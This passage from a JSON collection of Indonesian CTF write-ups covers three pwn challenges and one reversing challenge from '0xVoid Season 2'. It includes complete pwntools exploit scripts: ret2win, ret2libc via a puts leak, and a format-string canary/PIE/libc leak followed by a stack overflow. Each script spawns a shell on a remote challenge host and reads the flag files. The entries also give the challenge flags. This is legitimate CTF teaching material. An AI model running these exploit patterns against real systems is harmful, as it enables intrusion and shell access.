        "content": "Exploit lokal berhasil 3 kali berturut-turut, dengan leak dan base berbeda karena ASLR tetapi offset tetap valid. Contoh pola lokal:\n\n```text\nputs leak: 0x741a0d487cc0\nlibc base: 0x741a0d400000\nuid=1000(nata) gid=1000(nata) ...\n```\n\nRemote juga memberikan leak valid dan shell interaktif. Flag dibaca langsung dari `/home/ctf/flag.txt` pada service:\n\n```text\n0xV01D{cc1033e9d2a8baefc04fb019}\n```"
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Leak memiliki suffix yang cocok dengan offset `puts` pada libc challenge (`0x87cc0`). Gadget `ret` tambahan pada tahap kedua diperlukan untuk menjaga alignment stack saat masuk ke `system`. Shell remote tidak memakai TTY, sehingga muncul pesan `can't access tty`; command tetap dapat dijalankan normal."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\r\nfrom pathlib import Path\r\nimport time\r\nfrom pwn import *\r\n\r\nBASE_DIR = Path(__file__).resolve().parent\r\nBINARY_PATH = BASE_DIR / \"chall\"\r\nLIBC_PATH = BASE_DIR / \"libc.so.6\"\r\n\r\ncontext.binary = elf = ELF(str(BINARY_PATH), checksec=False)\r\nlibc = ELF(str(LIBC_PATH), checksec=False)\r\ncontext.arch = \"amd64\"\r\ncontext.log_level = \"info\"\r\n\r\nOFFSET = 0x58\r\nPOP_RDI = 0x4011ED\r\nRET = 0x40101A\r\nMAIN = 0x401090\r\nPUTS_PLT = 0x401060\r\n\r\n\r\ndef start():\r\n    if args.REMOTE:\r\n        host = args.HOST or \"35.192.106.100\"\r\n        port = int(args.PORT or 20002)\r\n        return remote(host, port)\r\n    if args.GDB:\r\n        return gdb.debug(\r\n            [str(BINARY_PATH)],\r\n            env={\"LD_LIBRARY_PATH\": str(BASE_DIR)},\r\n            gdbscript=\"set pagination off\\nbreak *0x4010dd\\ncontinue\",\r\n        )\r\n    return process([str(BINARY_PATH)], env={\"LD_LIBRARY_PATH\": str(BASE_DIR)})\r\n\r\n\r\ndef exploit(io):\r\n    io.recvuntil(b\"\\n\")\r\n\r\n    # Stage 1: puts(puts@GOT), lalu kembali ke fungsi input utama.\r\n    stage1 = flat(\r\n        b\"A\" * OFFSET,\r\n        POP_RDI,\r\n        elf.got[\"puts\"],\r\n        PUTS_PLT,\r\n        MAIN,\r\n    )\r\n    io.send(stage1)\r\n\r\n    leak_line = io.recvline(timeout=3)\r\n    if not leak_line:\r\n        raise RuntimeError(\"gagal menerima output leak\")\r\n    leak = u64(leak_line.rstrip(b\"\\n\").ljust(8, b\"\\0\"))\r\n    if leak & 0xfff != libc.sym[\"puts\"] & 0xfff:\r\n        raise RuntimeError(f\"leak puts tidak valid: {leak:#x}\")\r\n    libc.address = leak - libc.sym[\"puts\"]\r\n    log.success(f\"puts leak: {leak:#x}\")\r\n    log.success(f\"libc base: {libc.address:#x}\")\r\n\r\n    # Sinkronisasi dengan banner dari pemanggilan main kedua.\r\n    io.recvuntil(b\"\\n\")\r\n\r\n    # Stage 2: system(\"/bin/sh\"). RET menjaga alignment stack untuk libc.\r\n    stage2 = flat(\r\n        b\"B\" * OFFSET,\r\n        RET,\r\n        POP_RDI,\r\n        next(libc.search(b\"/bin/sh\\0\")),\r\n        libc.sym[\"system\"],\r\n    )\r\n    io.send(stage2)\r\n\r\n\r\ndef main():\r\n    io = start()\r\n    exploit(io)\r\n    # Sinkronisasi mencegah command ikut terbaca oleh read() tahap kedua.\r\n    time.sleep(1.0)\r\n    io.sendline(b\"cat /home/ctf/flag.txt\")\r\n    if args.REMOTE:\r\n        result = io.recvrepeat(2)\r\n        if result:\r\n            print(result.decode(errors=\"replace\"), end=\"\")\r\n    io.interactive()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xV01D{cc1033e9d2a8baefc04fb019}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-pwn-shellgame",
    "title": "Q1 — Shellgame Writeup",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Writeup for challenge Q1 — Shellgame Writeup",
    "problemDescription": "",
    "tools": [],
    "analysis": "Melihat string yang tersedia:\n\n```bash\nstrings chall\n```\n\nDitemukan informasi penting:\n\n```\nV0ID shellgame\noverflow your way to win(0xdeadbeef, 0xcafebabe)\n/bin/sh\nwrong gifts.\n```\n\nDari informasi tersebut diketahui terdapat fungsi `win()` yang membutuhkan dua argumen:\n\n```\narg1 = 0xdeadbeef\narg2 = 0xcafebabe\n```\n\nJika benar maka fungsi akan menjalankan shell.",
    "solution": [
      {
        "title": "Challenge Information",
        "content": "**Category:** PWN\n**Challenge Name:** Shellgame\n\n**Target:**\n\n```\nnc 35.192.106.100 20001\n```\n\n**Flag:**\n\n```\n0xV01D{5844c117e56ab5bdeed65785}\n```\n\n---"
      },
      {
        "title": "1. Reconnaissance",
        "content": "Diberikan sebuah binary `chall`.\n\nPertama melakukan pengecekan proteksi binary:\n\n```bash\nchecksec chall\n```\n\nHasil:\n\n```\nArch:       amd64-64-little\nRELRO:      Partial RELRO\nStack:      No canary found\nNX:         NX enabled\nPIE:        No PIE\n```\n\nKesimpulan:\n\n- Binary berjalan pada arsitektur x86-64.\n- Tidak terdapat stack canary sehingga buffer overflow dapat dilakukan.\n- PIE tidak aktif sehingga alamat fungsi tetap.\n- NX aktif sehingga tidak dapat menjalankan shellcode langsung.\n- Eksploitasi diarahkan ke teknik ROP/ret2win."
      },
      {
        "title": "3. Mencari Offset Buffer Overflow",
        "content": "Program dijalankan menggunakan pattern cyclic.\n\nMembuat cyclic pattern:\n\n```python\nfrom pwn import *\n\nprint(cyclic(200))\n```\n\nKemudian pattern dikirim ke program melalui gdb.\n\nSetelah crash:\n\n```\nRIP 0x401103\n```\n\nNilai stack menunjukkan RIP telah tertimpa oleh cyclic pattern.\n\nOffset dihitung menggunakan:\n\n```python\ncyclic_find(0x6161617461616173, n=8)\n```\n\nDidapatkan:\n\n```\n72 bytes\n```\n\nMaka padding awal payload adalah:\n\n```python\nb\"A\"*72\n```"
      },
      {
        "title": "4. Mencari Gadget ROP",
        "content": "Menggunakan:\n\n```bash\nROPgadget --binary chall\n```\n\nDitemukan gadget:\n\n```\npop rdi ; ret\n0x401204\n\npop rsi ; ret\n0x401206\n```\n\nPada sistem Linux x64:\n\n```\nRDI = argumen pertama\nRSI = argumen kedua\n```\n\nSehingga diperlukan:\n\n```\nRDI = 0xdeadbeef\nRSI = 0xcafebabe\n```"
      },
      {
        "title": "5. Mencari Fungsi win()",
        "content": "Karena binary stripped, fungsi tidak muncul sebagai simbol.\n\nMelakukan analisis disassembly:\n\n```bash\nobjdump -d chall\n```\n\nDitemukan fungsi:\n\n```\n0x401210\n```\n\nIsi fungsi:\n\n```asm\ncmp edi,0xdeadbeef\njne wrong\n\ncmp esi,0xcafebabe\njne wrong\n```\n\nJika kedua nilai benar:\n\n```asm\ncall puts\njmp system\n```\n\ndengan:\n\n```\n/bin/sh\n```"
      },
      {
        "title": "6. Membuat Payload",
        "content": "Struktur payload:\n\n```\npadding\n |\n v\npop rdi\n |\n v\n0xdeadbeef\n\npop rsi\n |\n v\n0xcafebabe\n\nwin()\n```\n\nPayload final:\n\n```python\nfrom pwn import *\n\ncontext.binary = elf = ELF(\"./chall\", checksec=False)\n\nio = remote(\n    \"35.192.106.100\",\n    20001\n)\n\npayload = flat(\n    b\"A\"*72,\n\n    0x401204,\n    0xdeadbeef,\n\n    0x401206,\n    0xcafebabe,\n\n    0x401210\n)\n\nio.sendline(payload)\n\nio.interactive()\n```"
      },
      {
        "title": "7. Exploit Execution",
        "content": "Menjalankan:\n\n```bash\npython3 solve.py\n```\n\nOutput:\n\n```\nV0ID shellgame — overflow your way to win(0xdeadbeef, 0xcafebabe)\n\nV0ID: the gate opens. go read /home/ctf/flag.txt\n```\n\nFungsi `win()` berhasil terpanggil.\n\nKemudian shell digunakan untuk membaca flag:\n\n```bash\ncat /home/ctf/flag.txt\n```\n\nOutput:\n\n```\n0xV01D{5844c117e56ab5bdeed65785}\n```"
      },
      {
        "title": "Exploit Chain",
        "content": "```\nBuffer Overflow\n        |\n        v\nOverwrite RIP\n        |\n        v\nROP Chain\n        |\n        v\nSet RDI = 0xdeadbeef\nSet RSI = 0xcafebabe\n        |\n        v\nwin()\n        |\n        v\nsystem(\"/bin/sh\")\n        |\n        v\nRead flag\n```\n\n```\n0xV01D{5844c117e56ab5bdeed65785}\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "from pwn import *\r\n\r\ncontext.binary = elf = ELF(\"./chall\", checksec=False)\r\n\r\nio = remote(\"35.192.106.100\",20001)\r\n\r\noffset = 72\r\n\r\npayload = flat(\r\n    b\"A\"*offset,\r\n\r\n    0x40101a,       # ret alignment\r\n\r\n    0x401204,       # pop rdi\r\n    0x402084,       # \"/bin/sh\"\r\n\r\n    0x401080        # system\r\n)\r\n\r\nio.sendline(payload)\r\n\r\nio.sendline(b\"cat /home/ctf/flag.txt\")\r\n\r\nprint(io.recvall(timeout=3).decode())"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xV01D{5844c117e56ab5bdeed65785}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-pwn-thevault",
    "title": "TheVault",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Writeup for challenge TheVault",
    "problemDescription": "Binary `chall` memiliki semua mitigasi aktif: Canary, PIE, Full RELRO, dan NX. Celah utama ada pada dua tahap input:\n\n1. `fgets(buf, 0x80, stdin)` lalu `printf(buf)`\n   Bagian ini menghasilkan bug format string karena input user dipakai langsung sebagai format string.\n\n2. `read(0, buf, 0x200)`\n   Bagian ini menghasilkan stack buffer overflow karena buffer stack lebih kecil daripada jumlah byte yang dibaca.\n\nStrategi exploit:\n\n1. Leak stack canary.\n2. Leak return address PIE untuk menghitung base binary.\n3. Leak alamat libc dari stack untuk menghitung base libc.\n4. Overflow tahap kedua dengan payload ret2libc.\n5. Jalankan `system(\"/bin/sh\")`.\n6. Baca flag.\n\nFlag final:\n\n```\n0xV01D{d825e0958f7f90c4ee3d0738}\n```",
    "tools": [],
    "analysis": "Pemeriksaan awal:\n\n```bash\nfile chall\nchecksec --file=chall\n```\n\nHasil mitigasi:\n\n```\nCanary    : enabled\nPIE       : enabled\nNX        : enabled\nRELRO     : Full RELRO\n```\n\nImplikasi mitigasi:\n\n- Canary membuat overflow langsung gagal kalau nilai canary tidak diketahui.\n- PIE membuat alamat binary berubah setiap run.\n- NX membuat shellcode di stack tidak bisa dieksekusi.\n- Full RELRO membuat overwrite GOT tidak praktis.\n\nKarena itu exploit paling aman adalah:\n\n```\nformat string leak -> hitung base address -> stack overflow -> ret2libc\n```\n\nDari static analysis, alur program terbagi menjadi dua input.\n\n### Tahap 1 — Format String\n\nProgram membaca input pendek lalu memanggil:\n\n```c\nprintf(buf);\n```\n\nKarena tidak memakai format literal seperti `printf(\"%s\", buf)`, user bisa membaca isi stack menggunakan `%p`.\n\nFormat string yang stabil:\n\n```\n%23$p|%25$p|%29$p\n```\n\nMakna leak:\n\n```\n%23$p -> stack canary\n%25$p -> return address PIE\n%29$p -> return address libc\n```\n\nContoh hasil leak lokal:\n\n```\ncanary   = 0xfdf96c215296e900\nPIE leak = base + 0x1147\nlibc leak= libc base + 0x2a1ca\n```\n\nOffset penting:\n\n```python\nPIE_RET_OFF  = 0x1147\nLIBC_RET_OFF = 0x2a1ca\n```\n\nBase address dihitung dengan:\n\n```python\npie_base = pie_ret - 0x1147\nlibc.address = libc_ret - 0x2a1ca\n```\n\n### Tahap 2 — Stack Overflow\n\nSetelah format string, program memberi satu kesempatan input lagi:\n\n```c\nread(0, buf, 0x200);\n```\n\nUkuran read `0x200` cukup besar untuk menimpa return address.\n\nLayout stack yang dipakai:\n\n```\nbuf              : 0x88 byte\ncanary           : +0x88\nsaved rbx / slot : +0x90\nreturn address   : +0x98\n```\n\nPayload overflow:\n\n```\n'A' * 0x88\ncanary\nsaved rbx dummy\nROP chain\n```",
    "solution": [
      {
        "title": "File Challenge",
        "content": "File penting di folder challenge:\n\n```\nchall\nlibc.so.6\nsolve.py\n```\n\nBinary menggunakan libc yang disediakan challenge, sehingga exploit remote perlu memakai offset dari `libc.so.6` tersebut."
      },
      {
        "title": "ROP Chain",
        "content": "Karena NX aktif, exploit tidak memakai shellcode. Payload memakai ret2libc:\n\n```\nret\npop rdi ; ret\n/bin/sh\nsystem\nexit\n```\n\nGadget `ret` tambahan dibutuhkan untuk stack alignment sebelum masuk ke `system()`. Tanpa alignment ini, exploit lokal sempat crash dengan SIGSEGV.\n\nROP chain final:\n\n```python\npayload = flat(\n    b\"A\" * 0x88,\n    p64(canary),\n    p64(0),\n    p64(ret),\n    p64(pop_rdi),\n    p64(binsh),\n    p64(system),\n    p64(exit_),\n)\n```"
      },
      {
        "title": "Penyebab Solver Lokal Berhasil Tapi Remote Gagal",
        "content": "Exploit lokal sebenarnya sudah benar dan bisa mendapatkan shell:\n\n```\nPWNED\nuid=1000(nata) gid=1000(nata) ...\n```\n\nMasalah remote ada pada kode berikut:\n\n```python\nif io.poll() is not None:\n```\n\nObjek `process()` dari pwntools punya method `.poll()`, tapi objek `remote()` tidak punya method tersebut. Akibatnya saat dijalankan remote:\n\n```bash\npython3 solve.py REMOTE\n```\n\nsolver crash sebelum payload diuji sepenuhnya:\n\n```\nAttributeError: 'remote' object has no attribute 'poll'\n```\n\nFix-nya adalah menghapus `.poll()` dan memakai handling universal yang berlaku untuk local maupun remote."
      },
      {
        "title": "Solver Final",
        "content": "Solver final:\n\n```python\n#!/usr/bin/env python3\nfrom pathlib import Path\nimport re\nimport time\nfrom pwn import *\n\nBASE_DIR = Path(__file__).resolve().parent\nBINARY_PATH = BASE_DIR / \"chall\"\nLIBC_PATH = BASE_DIR / \"libc.so.6\"\n\ncontext.binary = elf = ELF(str(BINARY_PATH), checksec=False)\nlibc = ELF(str(LIBC_PATH), checksec=False)\ncontext.arch = \"amd64\"\ncontext.log_level = args.LOG or \"info\"\n\nHOST = args.HOST or \"35.192.106.100\"\nPORT = int(args.PORT or 20003)\n\nFMT = b\"%23$p|%25$p|%29$p\"\n\nBUF_TO_CANARY = 0x88\nPIE_RET_OFF = 0x1147\nLIBC_RET_OFF = 0x2A1CA\n\n\ndef start():\n    if args.REMOTE:\n        return remote(HOST, PORT)\n\n    if args.GDB:\n        return gdb.debug(\n            [str(BINARY_PATH)],\n            env={\"LD_LIBRARY_PATH\": str(BASE_DIR)},\n            gdbscript=\"\"\"\nset pagination off\ncontinue\n\"\"\",\n        )\n\n    return process([str(BINARY_PATH)], env={\"LD_LIBRARY_PATH\": str(BASE_DIR)})\n\n\ndef parse_leaks(data: bytes):\n    m = re.search(\n        rb\"(0x[0-9a-fA-F]+)\\|(0x[0-9a-fA-F]+)\\|(0x[0-9a-fA-F]+)\",\n        data,\n    )\n    if not m:\n        raise RuntimeError(f\"could not parse leaks from: {data!r}\")\n\n    canary, pie_ret, libc_ret = (int(x, 16) for x in m.groups())\n\n    if (canary & 0xFF) != 0:\n        raise RuntimeError(f\"bad canary leak: {canary:#x}\")\n\n    return canary, pie_ret, libc_ret\n\n\ndef build_payload(canary: int) -> bytes:\n    rop = ROP(libc)\n\n    ret = rop.find_gadget([\"ret\"])[0]\n    pop_rdi = rop.find_gadget([\"pop rdi\", \"ret\"])[0]\n    binsh = next(libc.search(b\"/bin/sh\\x00\"))\n    system = libc.sym.system\n    exit_ = libc.sym.exit\n\n    payload = flat(\n        b\"A\" * BUF_TO_CANARY,\n        p64(canary),\n        p64(0),\n        p64(ret),\n        p64(pop_rdi),\n        p64(binsh),\n        p64(system),\n        p64(exit_),\n    )\n\n    if len(payload) > 0x200:\n        raise RuntimeError(f\"payload too large: {len(payload)} bytes\")\n\n    return payload\n\n\ndef exploit(io):\n    io.recvuntil(b\"vault> \", timeout=5)\n    io.sendline(FMT)\n\n    data = io.recvuntil(b\"one more gift?\", timeout=5)\n    canary, pie_ret, libc_ret = parse_leaks(data)\n\n    pie_base = pie_ret - PIE_RET_OFF\n    libc.address = libc_ret - LIBC_RET_OFF\n\n    log.success(\"canary    = %#x\", canary)\n    log.success(\"PIE base  = %#x\", pie_base)\n    log.success(\"libc base = %#x\", libc.address)\n\n    payload = build_payload(canary)\n    io.send(payload)\n\n    time.sleep(0.35)\n\n    cmd = args.CMD.encode() if args.CMD else (\n        b\"echo PWNED; cat /flag* /home/*/flag* 2>/dev/null; id\"\n    )\n    io.sendline(cmd)\n\n    try:\n        out = io.recvrepeat(1.5)\n        if out:\n            print(out.decode(errors=\"replace\"), end=\"\")\n    except EOFError:\n        pass\n\n    io.interactive()\n\n\ndef main():\n    io = start()\n    exploit(io)\n\n\nif __name__ == \"__main__\":\n    main()\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\nimport re\r\nimport time\r\nfrom pwn import *\r\n\r\nBASE_DIR = Path(__file__).resolve().parent\r\nBINARY_PATH = BASE_DIR / \"chall\"\r\nLIBC_PATH = BASE_DIR / \"libc.so.6\"\r\n\r\ncontext.binary = elf = ELF(str(BINARY_PATH), checksec=False)\r\nlibc = ELF(str(LIBC_PATH), checksec=False)\r\ncontext.arch = \"amd64\"\r\ncontext.log_level = args.LOG or \"info\"\r\n\r\nHOST = args.HOST or \"35.192.106.100\"\r\nPORT = int(args.PORT or 20003)\r\n\r\nFMT = b\"%23$p|%25$p|%29$p\"\r\n\r\nBUF_TO_CANARY = 0x88\r\nPIE_RET_OFF = 0x1147\r\nLIBC_RET_OFF = 0x2A1CA\r\n\r\n\r\ndef start():\r\n    if args.REMOTE:\r\n        return remote(HOST, PORT)\r\n\r\n    if args.GDB:\r\n        return gdb.debug(\r\n            [str(BINARY_PATH)],\r\n            env={\"LD_LIBRARY_PATH\": str(BASE_DIR)},\r\n            gdbscript=\"\"\"\r\nset pagination off\r\ncontinue\r\n\"\"\",\r\n        )\r\n\r\n    return process([str(BINARY_PATH)], env={\"LD_LIBRARY_PATH\": str(BASE_DIR)})\r\n\r\n\r\ndef parse_leaks(data: bytes):\r\n    log.debug(\"leak chunk: %r\", data)\r\n\r\n    m = re.search(\r\n        rb\"(0x[0-9a-fA-F]+)\\|(0x[0-9a-fA-F]+)\\|(0x[0-9a-fA-F]+)\",\r\n        data,\r\n    )\r\n    if not m:\r\n        raise RuntimeError(f\"could not parse leaks from: {data!r}\")\r\n\r\n    canary, pie_ret, libc_ret = (int(x, 16) for x in m.groups())\r\n\r\n    if (canary & 0xFF) != 0:\r\n        raise RuntimeError(f\"bad canary leak: {canary:#x}\")\r\n\r\n    if (pie_ret & 0xFFF) != (PIE_RET_OFF & 0xFFF):\r\n        log.warning(\r\n            \"PIE leak low bits unusual: leak=%#x expected_low=%#x\",\r\n            pie_ret,\r\n            PIE_RET_OFF & 0xFFF,\r\n        )\r\n\r\n    if (libc_ret & 0xFFF) != (LIBC_RET_OFF & 0xFFF):\r\n        log.warning(\r\n            \"libc leak low bits unusual: leak=%#x expected_low=%#x\",\r\n            libc_ret,\r\n            LIBC_RET_OFF & 0xFFF,\r\n        )\r\n\r\n    return canary, pie_ret, libc_ret\r\n\r\n\r\ndef build_payload(canary: int) -> bytes:\r\n    rop = ROP(libc)\r\n\r\n    ret = rop.find_gadget([\"ret\"])[0]\r\n    pop_rdi = rop.find_gadget([\"pop rdi\", \"ret\"])[0]\r\n    binsh = next(libc.search(b\"/bin/sh\\x00\"))\r\n    system = libc.sym.system\r\n    exit_ = libc.sym.exit\r\n\r\n    log.info(\"ret     = %#x\", ret)\r\n    log.info(\"pop rdi = %#x\", pop_rdi)\r\n    log.info(\"system  = %#x\", system)\r\n    log.info(\"exit    = %#x\", exit_)\r\n    log.info(\"/bin/sh = %#x\", binsh)\r\n\r\n    payload = flat(\r\n        b\"A\" * BUF_TO_CANARY,\r\n        p64(canary),\r\n        p64(0),          # saved rbx / callee-saved slot\r\n        p64(ret),        # stack alignment for system()\r\n        p64(pop_rdi),\r\n        p64(binsh),\r\n        p64(system),\r\n        p64(exit_),\r\n    )\r\n\r\n    if len(payload) > 0x200:\r\n        raise RuntimeError(f\"payload too large: {len(payload)} bytes\")\r\n\r\n    return payload\r\n\r\n\r\ndef exploit(io):\r\n    io.recvuntil(b\"vault> \", timeout=5)\r\n    io.sendline(FMT)\r\n\r\n    data = io.recvuntil(b\"one more gift?\", timeout=5)\r\n    canary, pie_ret, libc_ret = parse_leaks(data)\r\n\r\n    pie_base = pie_ret - PIE_RET_OFF\r\n    libc.address = libc_ret - LIBC_RET_OFF\r\n\r\n    log.success(\"canary    = %#x\", canary)\r\n    log.success(\"PIE base  = %#x\", pie_base)\r\n    log.success(\"libc base = %#x\", libc.address)\r\n\r\n    payload = build_payload(canary)\r\n\r\n    log.info(\"sending %d-byte overflow payload\", len(payload))\r\n    io.send(payload)\r\n\r\n    # Jangan pakai io.poll() di sini.\r\n    # remote() tidak punya .poll(), hanya process() yang punya.\r\n    time.sleep(0.35)\r\n\r\n    cmd = args.CMD.encode() if args.CMD else (\r\n        b\"echo PWNED; cat /flag* /home/*/flag* 2>/dev/null; id\"\r\n    )\r\n    io.sendline(cmd)\r\n\r\n    try:\r\n        out = io.recvrepeat(1.5)\r\n        if out:\r\n            print(out.decode(errors=\"replace\"), end=\"\")\r\n    except EOFError:\r\n        pass\r\n\r\n    io.interactive()\r\n\r\n\r\ndef main():\r\n    io = start()\r\n    exploit(io)\r\n\r\n\r\nif __name__ == \"__main__\": \r\n   main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xV01D{d825e0958f7f90c4ee3d0738}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-rev-afterimageprotocol",
    "title": "Afterimage Protocol",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Writeup for challenge Afterimage Protocol",
    "problemDescription": "Binary `afterimage` tidak menyimpan flag sebagai string. Program hanya mengecek format `0xV01D{...}`, mengambil 16 karakter body, menjalankannya melalui 320 operasi byte/word yang dibentuk dari section `.mist`, lalu membandingkan state akhir dengan target 16 byte yang juga berada di `.mist`.\n\nKarena setiap operasi transformasi bersifat invertible, flag dapat diperoleh tanpa brute force. Caranya adalah menghitung state akhir yang diharapkan, kemudian menjalankan seluruh operasi secara terbalik hingga kembali ke 16 byte input asli.\n\n**Flag:**\n\n```text\n0xV01D{N3bula7R4v3n9X2Q}\n```",
    "tools": [],
    "analysis": "`file` menunjukkan binary berupa ELF x86-64 static dan stripped.\n\nSection penting dari `readelf -S`:\n\n```text\n.text    VA 0x401000, file offset 0x1000, size 0x4d8\n.rodata  VA 0x402000, file offset 0x2000, size 0x84\n.mist    VA 0x402090, file offset 0x2090, size 0xa20\n```\n\n`strings` memperlihatkan output program:\n\n```text\nno matching reflection\nreflection accepted\nAfterimage Protocol v2\nidentifier>\n```\n\nSaat dijalankan, program membaca input dari stdin dan mencetak `reflection accepted` hanya untuk identifier yang valid.\n\nEntry point langsung berisi logic program karena binary static kecil dan stripped.\n\nValidasi format terdapat di awal `.text`:\n\n* panjang input sebelum newline harus `0x18` atau 24 byte;\n* byte awal harus `0xV01D{`;\n* byte terakhir harus `}`;\n* 16 byte di dalam braces harus alfanumerik.\n\nPotongan disassembly penting:\n\n```asm\n401070: cmp eax,0x18\n401075: cmp BYTE PTR [rsp-0x38],0x30 ; '0'\n40107c: cmp BYTE PTR [rsp-0x37],0x78 ; 'x'\n401083: cmp BYTE PTR [rsp-0x36],0x56 ; 'V'\n40108a: cmp BYTE PTR [rsp-0x35],0x30 ; '0'\n401091: cmp BYTE PTR [rsp-0x34],0x31 ; '1'\n401098: cmp BYTE PTR [rsp-0x33],0x44 ; 'D'\n40109f: cmp BYTE PTR [rsp-0x32],0x7b ; '{'\n4010a6: cmp BYTE PTR [rsp-0x21],0x7d ; '}'\n```\n\nBody flag kemudian disalin ke buffer 16 byte. Setelah itu program membaca data dari section `.mist`.\n\nTes dengan input salah:\n\n```bash\nprintf '0xV01D{AAAAAAAAAAAAAAAA}\\n' | ./afterimage\n```\n\nOutput:\n\n```text\nAfterimage Protocol v2\nidentifier> no matching reflection\n```\n\nTes dengan flag hasil solve:\n\n```bash\nprintf '0xV01D{N3bula7R4v3n9X2Q}\\n' | ./afterimage\n```\n\nOutput:\n\n```text\nAfterimage Protocol v2\nidentifier> reflection accepted\n```",
    "solution": [
      {
        "title": "File Challenge",
        "content": "Isi arsip:\n\n```text\nafterimage       ELF 64-bit LSB executable, x86-64, statically linked, stripped\nREADME.md        deskripsi challenge\nSHA256SUMS.txt   hash file challenge\n```\n\nHash dari `SHA256SUMS.txt` valid:\n\n```text\nafterimage: OK\n```"
      },
      {
        "title": "Layout `.mist`",
        "content": "Layout section `.mist` adalah:\n\n```text\noffset 0x00: magic/header      MRR2...\noffset 0x08: seed qword        0xd1ceb00c7a11f00d\noffset 0x10: 320 qword tape\noffset akhir: target 16 byte   15e0df1367f542d563d4eaccdcb1dd8b\n```\n\nLoop utama dimulai dari `ebx = 0x29`, lalu setiap iterasi `ebx += 0x49` hingga `0x5b69`.\n\nIndex tape dihitung dengan:\n\n```text\nidx = ebx % 0x140\n```\n\nJumlah iterasi:\n\n```text\n(0x5b69 - 0x29) / 0x49 = 320\n```\n\nKarena:\n\n```text\ngcd(0x49, 0x140) = 1\n```\n\nloop mengunjungi seluruh 320 slot tape dalam urutan terlipat."
      },
      {
        "title": "Algoritma Validasi / Encoding",
        "content": "Program membentuk 320 instruksi dari section `.mist`.\n\nSetiap slot tape di-XOR dengan mask SplitMix64-like yang berbasis seed dan `idx`.\n\nPseudocode pembentukan instruksi:\n\n```text\nidx = ebx % 0x140\n\ntape_qword = mist[0x10 + idx * 8 : 0x10 + idx * 8 + 8]\n\nmask = splitmix64_finalizer(\n    (0xd6e8feb86659fd93 * idx) ^\n    seed ^\n    0xa17e5eedc0dec0de +\n    GOLDEN\n)\n\nkey = tape_qword ^ mask\n\nselector = (\n    ((0x1d * idx - 0x59) ^ key_low_dword) & 0xff\n) % 7\n```\n\n`key` juga masuk ke FNV-1a 64-bit accumulator. Accumulator ini dipakai pada tahap compare akhir dan tidak berasal dari input user.\n\nTerdapat tujuh operasi terhadap state 16 byte:\n\n| Selector | Operasi                                         |\n| -------: | ----------------------------------------------- |\n|        0 | XOR 1 byte                                      |\n|        1 | ADD 1 byte modulo 256                           |\n|        2 | ROL 1 byte                                      |\n|        3 | SWAP 2 byte                                     |\n|        4 | Multiply byte dengan odd multiplier + konstanta |\n|        5 | Feistel-like transform pada 2 × 64-bit half     |\n|        6 | Rotate seluruh state 16 byte                    |\n\n### Sifat Invertible\n\nSemua operasi dapat dibalik:\n\n* **XOR** dibalik dengan XOR yang sama.\n* **ADD** dibalik dengan SUB.\n* **ROL** dibalik dengan ROR.\n* **SWAP** dibalik dengan SWAP kembali.\n* **Multiply byte** menggunakan multiplier ganjil, sehingga memiliki inverse modulo `256`.\n* **Feistel-like transform** dibalik dengan `R = newL`, kemudian fungsi `F(R)` dihitung ulang untuk memperoleh `L`.\n* **Rotate 16 byte** dibalik dengan rotasi ke arah sebaliknya.\n\nDengan demikian, tidak diperlukan brute force terhadap 16 karakter flag."
      },
      {
        "title": "Tahap Compare Akhir",
        "content": "Program membandingkan state akhir dengan 16 byte target di akhir `.mist`.\n\nTarget tidak dibandingkan secara langsung, tetapi terlebih dahulu di-XOR dengan mask SplitMix64-like berbasis FNV accumulator:\n\n```text\nfinal_key = fnv ^ seed\n\nexpected_state[i] =\n    target[i] ^\n    (\n        splitmix64_finalizer(\n            (i * GOLDEN) ^ final_key + GOLDEN\n        ) & 0xff\n    )\n```\n\nState akhir yang diharapkan adalah:\n\n```text\n4ea0ddff1529f760f4e773f9d7f8c390\n```\n\nKemudian seluruh 320 operasi dijalankan secara terbalik. Hasil akhirnya adalah:\n\n```text\nN3bula7R4v3n9X2Q\n```"
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "`solve.py` melakukan langkah berikut:\n\n1. Membaca binary `afterimage`.\n2. Mengambil section `.mist` dari offset `0x2090` dengan ukuran `0xa20`.\n3. Membentuk ulang 320 instruksi dari tape.\n4. Menghitung FNV accumulator dan expected final state.\n5. Menjalankan inverse operation dari instruksi ke-320 sampai instruksi pertama.\n6. Mengecek ulang hasilnya dengan forward emulator.\n7. Mencetak body dan flag.\n\nOutput script:\n\n```text\nseed       : 0xd1ceb00c7a11f00d\nops        : 320 {0: 44, 1: 48, 2: 50, 3: 52, 4: 38, 5: 40, 6: 48}\nfnv        : 0xe0b595643124827b\nfinal state: 4ea0ddff1529f760f4e773f9d7f8c390\nbody       : N3bula7R4v3n9X2Q\nflag       : 0xV01D{N3bula7R4v3n9X2Q}\n```"
      },
      {
        "title": "Cara Menjalankan",
        "content": "Jalankan:\n\n```bash\ncd /mnt/data/afterimage_protocol\npython3 solve.py\n```\n\nUntuk memvalidasi hasil secara langsung terhadap binary:\n\n```bash\nprintf '0xV01D{N3bula7R4v3n9X2Q}\\n' | ./afterimage\n```\n\nExpected output:\n\n```text\nAfterimage Protocol v2\nidentifier> reflection accepted\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
